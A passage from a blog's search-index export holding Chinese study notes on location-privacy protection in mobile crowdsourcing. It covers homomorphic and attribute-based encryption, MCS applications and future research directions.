href="#基于加密的方法"></a> 基于加密的方法</h5><p>可分为同态加密、基于属性加密和区块链</p><p><strong>同态加密</strong>是基于对两条信息同时加密，这样对两条密文进行加法操作就会得到两条密文的密文和的基础。也就是说，把工作任务和工作者位置进行加密后传递给MCS平台，平台可以直接对两个加密的信息进行运算规划任务分配，而无须得到工作者真实的位置信息明文。</p><p><strong>基于属性加密</strong>则是把任务区域划分成一个个网格，再给处于同一区域内的工作者一个相同的属性，可以是前缀或者相同秘钥，这样就能实现只有处于一个属性的实体才能解读明文，保护了工人的隐私。</p><p><strong>区块链</strong>看不懂……</p><h6 id="讨论-3"><a class="markdownIt-Anchor" href="#讨论-3"></a> 讨论</h6><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230904110141.png" alt="img" /></p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230904110212.png" alt="img" /></p><h4 id="主要类别方法的比较"><a class="markdownIt-Anchor" href="#主要类别方法的比较"></a> 主要类别方法的比较</h4><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230904110230.png" alt="img" /></p><h4 id="目前mcs应用的现状"><a class="markdownIt-Anchor" href="#目前mcs应用的现状"></a> 目前MCS应用的现状</h4><ol><li>交通系统，地图软件，实时更新的导航地图app</li><li>公民合作，公民向政府报告非紧急社区问题</li><li>移动社交网络，分享当前位置的信息、签到</li><li>其他应用程序，链接企业与愿意在附近地点执行任务赚钱的智能手机用户。</li></ol><h4 id="未来的研究方向"><a class="markdownIt-Anchor" href="#未来的研究方向"></a> 未来的研究方向</h4><ul><li>保护位置持续披露</li><li>隐私-效用权衡</li><li>算力开销/效率</li></ul><h4 id="结论"><a class="markdownIt-Anchor" href="#结论"></a> 结论</h4><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/20230904110250.png" alt="img" /></p>]]></content>
      
      
      <categories>
          
          <category> 隐私保护计算 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DP </tag>
            
            <tag> difference privacy </tag>
            
            <tag> Mobile Crowdsourcing </tag>
            
            <tag> Location-based service </tag>
            
            <tag> k-anonymization </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
